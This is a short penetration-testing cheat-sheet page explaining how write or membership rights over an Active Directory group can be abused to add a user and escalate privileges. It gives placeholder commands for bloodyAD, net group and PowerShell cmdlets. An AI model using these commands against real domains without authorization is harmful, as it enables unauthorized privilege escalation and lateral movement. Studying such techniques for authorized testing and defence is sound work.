---
title: "Abuse ACL access over groups"
description: Use access rights over a group to add users
categories: [Active Directory, Privilege Escalation]
tags: [Active Direcotory, Privilege Escalation, Lateral Movement, ACL Abuse]
weight: 2
---

Member principals within a Active Directory group automatically inherits the accesses and privileges granted to that group. If the principal we control have sufficient privileges over a group (`GenericAll`, `GenericWrite`, `AllExtendedRights` or `Self-Membership`), we can add another principal (e.g. a low-priv user) to the group so the principal inherits all access rights granted to the group.

## Linux Perspective
From a Linux attacker machine, we can use bloodyAD to add a user to a group.
```bash
bloodyAD --host <dc_host> -d <domain> -u <username> -p <password> add groupMember <target_group> <target_user>
```

## Windows Perspective
We can use native `net` utility to add a user to a group.
```cmd
net group <target_group> <target_user> /add /domain
```

With PowerShell, we may either use the `Add-ADGroupMember` cmdlet from the native AD module, as well as `Add-DomainGroupMember` from PowerView.
```PowerShell
Add-ADGroupMember -Identity <target_group> -Members <target_user>
```
```PowerShell
Add-DomainGroupMember -Identity <target_group> -Members <target_user>
```

